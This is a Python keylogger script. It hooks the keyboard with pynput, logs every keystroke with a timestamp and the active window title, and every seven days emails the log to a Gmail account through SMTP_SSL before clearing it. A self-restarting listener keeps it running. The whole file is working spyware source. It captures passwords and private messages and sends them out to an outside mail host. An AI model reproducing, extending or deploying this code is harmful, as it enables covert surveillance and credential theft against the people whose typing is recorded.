# Importing libs
from pynput import keyboard
from datetime import date, datetime
from linecache import getline
from smtplib import SMTP_SSL
from pyautogui import getActiveWindowTitle
from sys import setrecursionlimit

# Check if it's time to send the log file
day = int(getline("check_file", 1))
month = int(getline("check_file", 2))
year_today = int(date.today().year)
last_check = date(year_today, month, day)

day_today = int(date.today().day)
month_today = int(date.today().month)
today = date(year_today, month_today, day_today)
    
time = str(today - last_check)
check_time = int(time[0:1])
if check_time != 0:
    time = int(time[0:2])
    # If it's time then the log will be emailed, deleted and the last check day will be updated
    if time >= 7:
        today = str(date.today())
        file = open("log_file", "r")
        file_text = file.read()
        email_text = 'Subject: Your e-mail subject ' + today + '\n\n'
        email_text += file_text
        email_text = email_text.encode('utf-8')

        connection = SMTP_SSL('smtp.gmail.com', 465)
        connection.login('xxxxxxxxxx@gmail.com', 'xxxx xxxx xxxx xxxx') # Your email and Google App passwords crated password
        connection.sendmail('', 'xxxxxxxxxx@gmail.com', email_text)     # Your email again
        connection.quit()

        file = open('check_file', 'w')
        file.writelines(str(day_today) + "\n" + str(month_today))
        file.close()
        file = open('log_file', 'r+')
        file.truncate(0)
        file.close()

# Function to put the date, the name of the active window and the key in the log file
def add_log(skey):
    current_time = datetime.now()
    current_time_hour = str(current_time.hour)
    current_time_minute = str(current_time.minute)
    current_time_second = str(current_time.second)
    try:
        window_name = getActiveWindowTitle()
    except AttributeError:
        return False

    file = open('log_file', 'a')
    file.writelines("\n" +  current_time_hour + ":" + current_time_minute + ":" + current_time_second + " | " + window_name + ": " + skey)
    file.close()
    
# Function that transform what the user types and send it to add_log function
def press(key):
    try:
        if key == keyboard.Key.esc:
            add_log("<esc>")
        elif key == keyboard.Key.cmd_l or key == keyboard.Key.cmd_r:
            add_log("<win>")
        elif key == keyboard.Key.delete:
            add_log("<delete>")
        elif key == keyboard.Key.space:
            add_log("<space>")
        elif key == keyboard.Key.backspace:
            add_log("<backspace>")
        elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
            add_log("<shift>")
        elif key == keyboard.Key.enter:
            add_log("<enter>")
        elif key == keyboard.Key.tab:
            add_log("<tab>")
        elif key == keyboard.Key.alt_gr or key == keyboard.Key.alt_l or key == keyboard.Key.alt_r or key == keyboard.Key:
            add_log("<alt>")
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r or key == keyboard.Key.ctrl:
            add_log("<ctrl>")
        elif key == keyboard.Key.caps_lock:
            add_log("<caps_lock>")
        elif key == keyboard.Key.left:
            add_log("<left_arrow>")
        elif key == keyboard.Key.right:
            add_log("<right_arrow>")
        else:
            ekey = (f"" + "<{0}>".format(key.char))
            add_log(ekey)
    except AttributeError:
        add_log("Key not Found")

# Start the listener. If it stops working while listening, will be restarted
setrecursionlimit(10000)

def start():
    try:
        with keyboard.Listener(on_press=press) as listener:
            listener.join()
    except Exception:
        start()

start()
